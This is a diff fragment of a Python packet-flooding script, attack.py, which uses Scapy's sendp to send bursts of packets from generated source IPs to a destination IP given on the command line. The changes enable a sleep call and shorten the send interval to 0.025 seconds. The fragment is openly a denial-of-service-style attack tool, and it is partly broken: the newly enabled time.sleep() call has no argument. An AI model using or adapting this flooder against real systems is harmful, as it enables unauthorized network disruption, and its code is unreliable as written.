@@ -29,12 +29,12 @@ def generateSourceIP():
 def main(): # 2500 packets attack
     for i in range (1, 5):
         launchAttack()
-        #time.sleep ()
+        time.sleep ()
 
 def launchAttack():
-  #eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
+#   eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
   destinationIP = sys.argv[1:]
-  #print destinationIP
+#   print destinationIP
 
   interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
 
@@ -43,7 +43,7 @@ def launchAttack():
     print(repr(packets))
 
     #send packets with interval = 0.025 s
-    sendp(packets, iface = interface.rstrip(), inter = 0.05)
+    sendp(packets, iface = interface.rstrip(), inter = 0.025)
 
 if __name__=="__main__":
   main()
